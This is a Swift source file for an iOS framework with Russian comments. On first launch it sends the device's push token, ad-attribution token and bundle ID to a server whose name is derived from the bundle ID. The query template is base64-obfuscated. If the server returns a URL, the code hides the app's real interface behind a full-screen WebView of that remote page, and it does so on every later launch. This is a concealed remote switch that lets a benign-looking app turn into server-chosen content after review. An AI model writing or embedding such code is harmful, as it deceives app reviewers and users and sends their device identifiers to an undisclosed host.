import Foundation
import SwiftUI
import WebKit
import AdServices
import UserNotifications

public class SWFramework: ObservableObject {
    public static let shared = SWFramework()
    
    // Публичные свойства для работы с UI
    @Published public var showWebView: Bool = false
    @Published private(set) var currentUrl: URL?
    
    // Приватные свойства
    private let userDefaults = UserDefaults.standard
    private let timeout: TimeInterval = 15.0
    
    // Ключи для UserDefaults
    private let webUrlStorageKey = "com.swf.webUrl"
    private let firstLaunchKey = "com.swf.firstLaunch"
    private let apnsTokenKey = "com.swf.apnsToken"
    
    private init() {}
    
    /// Инициализирует фреймворк с автоматической генерацией домена из bundle_id
    /// - Parameters:
    ///   - application: Экземпляр UIApplication
    ///   - launchOptions: Опции запуска из AppDelegate
    ///   - completion: Обратный вызов, когда обычный поток приложения должен продолжиться
    public func initialize(application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(domain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                safeMainCompletion(completion)
            } else {
                safeMainCompletion(completion)
            }
        }
    }
    
    /// Генерирует домен из bundle_id, удаляя точки и добавляя .top
    /// - Parameter bundleId: Идентификатор бандла
    /// - Returns: Сгенерированный домен
    private func generateDomain(_ bundleId: String) -> String {
        let processedString = bundleId.replacingOccurrences(of: ".", with: "")
        return "\(processedString).top"
    }
    
    // Для обратной совместимости сохраняем оригинальный метод с явным доменом
    @available(*, deprecated, message: "Используйте initialize без параметра домена")
    public func initialize(domain: String, application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        // Для обратной совместимости все равно генерируем домен из bundleId
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let generatedDomain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(generatedDomain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                safeMainCompletion(completion)
            } else {
                safeMainCompletion(completion)
            }
        }
    }
    
    private func processFirstLaunch(_ domain: String, _ application: UIApplication, _ completion: @escaping () -> Void) {
        // Создаем объект для хранения данных
        var deviceData = DeviceData()
        
        // Устанавливаем bundleId
        deviceData.bundleId = Bundle.main.bundleIdentifier
        
        // Флаг, указывающий, был ли уже вызван completion
        var completionCalled = false
        
        // Безопасный вызов completion только один раз
        let safeCompletion = { [weak self] in
            guard let self = self, !completionCalled else { return }
            completionCalled = true
            self.safeMainCompletion(completion)
        }
        
        // Создаем таймер для всей операции
        let timeoutTimer = Timer.scheduledTimer(withTimeInterval: timeout, repeats: false) { _ in
            // По таймауту просто завершаем операцию
            safeCompletion()
        }
        
        // Получаем APNS токен, затем Attribution токен, затем отправляем данные
        self.getAPNSToken(application) { apnsToken in
            guard !completionCalled else { 
                timeoutTimer.invalidate()
                return 
            }
            
            deviceData.apnsToken = apnsToken
            
            self.getAttributionToken { attToken in
                guard !completionCalled else { 
                    timeoutTimer.invalidate()
                    return 
                }
                
                deviceData.attToken = attToken
                
                // Отменяем таймер, так как мы получили все токены
                timeoutTimer.invalidate()
                
                // Отправляем данные на сервер
                self.sendDataToServer(domain, deviceData) { resultUrl in
                    guard !completionCalled else { return }
                    
                    if let resultUrl = resultUrl, !resultUrl.isEmpty {
                        // Сохраняем URL для будущего использования
                        self.userDefaults.set(resultUrl, forKey: self.webUrlStorageKey)
                        // Настраиваем WebView
                        self.setupWebView(resultUrl)
                    }
                    
                    // Вызываем завершающий блок
                    safeCompletion()
                }
            }
        }
    }
    
    private func sendDataToServer(_ domain: String, _ deviceData: DeviceData, completion: @escaping (String?) -> Void) {
        // Шаблон данных для отправки на сервер в формате base64
        let base64String = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
        
        // Декодируем шаблон
        if let decodedData = Data(base64Encoded: base64String),
           var dataTemplate = String(data: decodedData, encoding: .utf8) {
            
            // Заменяем плейсхолдеры реальными значениями
            dataTemplate = dataTemplate.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
            
            // Кодируем данные обратно в base64
            if let encodedData = dataTemplate.data(using: .utf8)?.base64EncodedString() {
                // Формируем URL для отправки данных
                guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                    completion(nil)
                    return
                }
                
                // Создаем задачу для отправки запроса
                let task = URLSession.shared.dataTask(with: url) { data, _, error in
                    // Проверяем наличие данных и отсутствие ошибок
                    guard let data = data, error == nil else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                        return
                    }
                    
                    // Пытаемся декодировать ответ
                    if let response = String(data: data, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion(response)
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                    }
                }
                
                // Запускаем задачу
                task.resume()
                return
            }
        }
        
        // Если что-то пошло не так, отправляем исходный шаблон
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(base64String)") else {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: url) { data, _, error in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            if let response = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    completion(response)
                }
            } else {
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
        
        task.resume()
    }
    
    private func setupWebView(_ urlString: String) {
        // Добавляем префикс https, если его нет
        let processedUrl = ensureHttpsPrefix(urlString)
        
        // Проверяем, что URL валиден
        guard let url = URL(string: processedUrl) else { return }
        
        // Устанавливаем URL и показываем WebView
        DispatchQueue.main.async {
            self.currentUrl = url
            self.showWebView = true
        }
    }
    
    private func ensureHttpsPrefix(_ urlString: String) -> String {
        // Добавляем https, если URL не начинается с http:// или https://
        if !urlString.lowercased().starts(with: "http://") && !urlString.lowercased().starts(with: "https://") {
            return "https://" + urlString
        }
        return urlString
    }
    
    private func getAPNSToken(_ application: UIApplication, completion: @escaping (String?) -> Void) {
        // Проверяем, есть ли сохраненный токен
        if let savedToken = getSavedAPNSToken() {
            // Если есть сохраненный токен, используем его
            completion(savedToken)
            return
        }
        
        // Проверяем текущие настройки уведомлений
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            // Обрабатываем результат в главном потоке
            DispatchQueue.main.async {
                if settings.authorizationStatus == .authorized {
                    // Регистрируем приложение для получения уведомлений
                    application.registerForRemoteNotifications()
                    
                    // Устанавливаем таймер для ожидания токена
                    let tokenTimer = Timer.scheduledTimer(withTimeInterval: self.timeout, repeats: false) { _ in
                        // Если токен не получен за timeout секунд, используем заглушку
                        let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                        completion(fallbackToken)
                    }
                    
                    // Используем класс-обертку для безопасной отмены наблюдателя
                    class TokenObserver {
                        var observer: NSObjectProtocol?
                    }
                    
                    let tokenObserver = TokenObserver()
                    
                    // Создаем наблюдателя
                    tokenObserver.observer = NotificationCenter.default.addObserver(
                        forName: Notification.Name("APNSTokenReceived"),
                        object: nil,
                        queue: .main
                    ) { notification in
                        // Если получили уведомление о токене
                        if let token = notification.userInfo?["token"] as? String {
                            // Отменяем таймер
                            tokenTimer.invalidate()
                            
                            // Удаляем наблюдателя безопасно
                            if let observer = tokenObserver.observer {
                                NotificationCenter.default.removeObserver(observer)
                            }
                            
                            // Возвращаем токен
                            completion(token)
                        }
                    }
                } else {
                    // Запрашиваем разрешение на уведомления
                    let center = UNUserNotificationCenter.current()
                    center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
                        DispatchQueue.main.async {
                            if granted {
                                // Регистрируем для уведомлений
                                application.registerForRemoteNotifications()
                                
                                // Устанавливаем таймер для ожидания токена
                                let tokenTimer = Timer.scheduledTimer(withTimeInterval: self.timeout, repeats: false) { _ in
                                    // Если токен не получен за timeout секунд, используем заглушку
                                    let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                                    completion(fallbackToken)
                                }
                                
                                // Используем класс-обертку для безопасной отмены наблюдателя
                                class TokenObserver {
                                    var observer: NSObjectProtocol?
                                }
                                
                                let tokenObserver = TokenObserver()
                                
                                // Создаем наблюдателя
                                tokenObserver.observer = NotificationCenter.default.addObserver(
                                    forName: Notification.Name("APNSTokenReceived"),
                                    object: nil,
                                    queue: .main
                                ) { notification in
                                    // Если получили уведомление о токене
                                    if let token = notification.userInfo?["token"] as? String {
                                        // Отменяем таймер
                                        tokenTimer.invalidate()
                                        
                                        // Удаляем наблюдателя безопасно
                                        if let observer = tokenObserver.observer {
                                            NotificationCenter.default.removeObserver(observer)
                                        }
                                        
                                        // Возвращаем токен
                                        completion(token)
                                    }
                                }
                            } else {
                                // Если разрешение не получено, используем заглушку
                                let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                                completion(fallbackToken)
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Получение сохраненного APNS токена
    private func getSavedAPNSToken() -> String? {
        return userDefaults.string(forKey: apnsTokenKey)
    }
    
    // Сохранение APNS токена
    private func saveAPNSToken(_ token: String) {
        userDefaults.set(token, forKey: apnsTokenKey)
    }
    
    private func getAttributionToken(completion: @escaping (String?) -> Void) {
        // Обрабатываем в главном потоке
        DispatchQueue.main.async {
            // Проверяем версию iOS
            if #available(iOS 14.3, *) {
                // Безопасно получаем Attribution токен
                do {
                    let token = try AdServices.AAAttribution.attributionToken()
                    completion(token)
                } catch {
                    // В случае ошибки возвращаем nil
                    completion(nil)
                }
            } else {
                // Для старых версий iOS просто возвращаем nil
                completion(nil)
            }
        }
    }
    
    // Вызывается из AppDelegate приложения
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        // Выполняем на главном потоке
        DispatchQueue.main.async {
            // Преобразуем данные токена в строку
            let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
            let token = tokenParts.joined()
            
            // Проверяем, что токен не пустой
            guard !token.isEmpty else {
                return
            }
            
            // Сохраняем токен
            self.saveAPNSToken(token)
            
            // Отправляем уведомление о получении токена
            NotificationCenter.default.post(
                name: Notification.Name("APNSTokenReceived"),
                object: nil,
                userInfo: ["token": token]
            )
        }
    }
    
    // Безопасное выполнение completion на главном потоке
    private func safeMainCompletion(_ completion: @escaping () -> Void) {
        if Thread.isMainThread {
            completion()
        } else {
            DispatchQueue.main.async {
                completion()
            }
        }
    }
}

// MARK: - Supporting Classes and Structures

// Структура для хранения данных устройства
private struct DeviceData {
    var apnsToken: String?
    var attToken: String?
    var bundleId: String?
}

// MARK: - SwiftUI Integration Helpers

// Модификатор для инициализации фреймворка
public struct SWFrameworkInitializer: ViewModifier {
    @StateObject private var appDelegate = SWAppDelegate()
    
    public func body(content: Content) -> some View {
        content
            .environmentObject(SWFramework.shared)
            .onAppear {
                appDelegate.initializeFramework()
            }
    }
    
    public init() {}
}

// App Delegate для инициализации SWFramework
public class SWAppDelegate: NSObject, ObservableObject, UIApplicationDelegate {
    public func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        initializeFramework(application: application, launchOptions: launchOptions)
        return true
    }
    
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        SWFramework.shared.application(application, didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }
    
    func initializeFramework(application: UIApplication = UIApplication.shared, launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) {
        SWFramework.shared.initialize(application: application, launchOptions: launchOptions) { }
    }
}

// Extension для View для легкой инициализации
public extension View {
    func initSWFramework() -> some View {
        self.modifier(SWFrameworkInitializer())
    }
}

// MARK: - WebView Integration

// Основная SwiftUI обертка для WebView
public struct SWWebView: View {
    @ObservedObject public var framework = SWFramework.shared
    private var contentView: AnyView
    
    public init(contentView: AnyView) {
        self.contentView = contentView
    }
    
    public var body: some View {
        ZStack {
            contentView
                .opacity(framework.showWebView ? 0 : 1)
                .animation(.easeInOut, value: framework.showWebView)
            
            if framework.showWebView, let url = framework.currentUrl {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    SafeWebView(url: url)
                        .ignoresSafeArea()
                }
                .transition(.opacity)
                .animation(.easeInOut, value: true)
            }
        }
        // Используем стандартный модификатор SwiftUI
        .statusBar(hidden: framework.showWebView)
    }
}

// Безопасная обертка для WebView
struct SafeWebView: View {
    let url: URL
    
    var body: some View {
        WebViewContainer(url: url)
            .ignoresSafeArea()
            .background(Color.black)
    }
}

// Контейнер для WebView с правильной обработкой жизненного цикла
struct WebViewContainer: UIViewRepresentable {
    let url: URL
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = []
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.backgroundColor = .black
        webView.scrollView.backgroundColor = .black
        webView.isOpaque = false
        webView.scrollView.contentInsetAdjustmentBehavior = .never
        webView.scrollView.bounces = false
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        
        return webView
    }
    
    func updateUIView(_ webView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        webView.load(request)
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        var parent: WebViewContainer
        
        init(_ parent: WebViewContainer) {
            self.parent = parent
        }
        
        // Обработка запросов разрешения на доступ к камере
        public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
            decisionHandler(.prompt)
        }
    }
} 